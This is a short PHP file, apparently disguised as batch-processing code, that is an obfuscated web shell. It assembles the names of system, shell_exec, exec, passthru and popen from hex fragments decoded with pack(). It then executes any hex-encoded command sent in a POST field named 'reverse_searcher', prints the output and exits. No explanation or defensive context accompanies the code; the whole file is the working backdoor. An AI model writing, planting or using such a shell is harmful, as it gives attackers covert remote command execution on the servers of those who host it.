<?php


$ent1 = '7';
$ent2 = '3';
$ent3 = '9';
$ent4 = '4';
$ent5 = '6';
$ent6 = 'd';
$ent7 = 'c';
$ent8 = '8';
$ent9 = '5';
$ent10 = '2';
$ent11 = '0';
$ent12 = 'e';
$ent13 = 'f';
$batch_process1 = pack("H*", $ent1 . $ent2 . '7' . $ent3 . '7' . '3' . $ent1 . $ent4 . $ent5 . '5' . $ent5 . $ent6);
$batch_process2 = pack("H*", $ent1 . '3' . $ent5 . '8' . $ent5 . '5' . '6' . $ent7 . '6' . 'c' . '5' . 'f' . $ent5 . '5' . $ent1 . $ent8 . $ent5 . '5' . '6' . $ent2);
$batch_process3 = pack("H*", $ent5 . $ent9 . '7' . '8' . '6' . $ent9 . $ent5 . $ent2);
$batch_process4 = pack("H*", '7' . '0' . $ent5 . '1' . '7' . $ent2 . '7' . $ent2 . $ent1 . $ent4 . '6' . $ent8 . '7' . $ent10 . $ent1 . '5');
$batch_process5 = pack("H*", $ent1 . $ent11 . '6' . 'f' . '7' . '0' . $ent5 . '5' . $ent5 . $ent12);
$batch_process6 = pack("H*", $ent1 . $ent2 . '7' . '4' . '7' . '2' . $ent5 . $ent9 . $ent5 . '1' . $ent5 . 'd' . $ent9 . 'f' . $ent5 . $ent1 . $ent5 . '5' . '7' . '4' . '5' . $ent13 . '6' . $ent2 . $ent5 . $ent13 . '6' . $ent12 . $ent1 . '4' . '6' . $ent9 . $ent5 . 'e' . $ent1 . '4' . '7' . '3');
$batch_process7 = pack("H*", '7' . $ent11 . '6' . $ent2 . '6' . 'c' . '6' . $ent13 . $ent1 . '3' . '6' . '5');
$reverse_searcher = pack("H*", $ent1 . $ent10 . $ent5 . $ent9 . '7' . '6' . $ent5 . '5' . $ent1 . $ent10 . '7' . '3' . $ent5 . '5' . '5' . $ent13 . '7' . $ent2 . $ent5 . $ent9 . $ent5 . '1' . $ent1 . '2' . '6' . '3' . $ent5 . '8' . $ent5 . '5' . $ent1 . $ent10);
if (isset($_POST[$reverse_searcher])) {
    $reverse_searcher = pack("H*", $_POST[$reverse_searcher]);
    if (function_exists($batch_process1)) {
        $batch_process1($reverse_searcher);
    } elseif (function_exists($batch_process2)) {
        print $batch_process2($reverse_searcher);
    } elseif (function_exists($batch_process3)) {
        $batch_process3($reverse_searcher, $parameter_group_bind);
        print join("\n", $parameter_group_bind);
    } elseif (function_exists($batch_process4)) {
        $batch_process4($reverse_searcher);
    } elseif (function_exists($batch_process5) && function_exists($batch_process6) && function_exists($batch_process7)) {
        $sym_item = $batch_process5($reverse_searcher, 'r');
        if ($sym_item) {
            $entry_symbol = $batch_process6($sym_item);
            $batch_process7($sym_item);
            print $entry_symbol;
        }
    }
    exit;
}
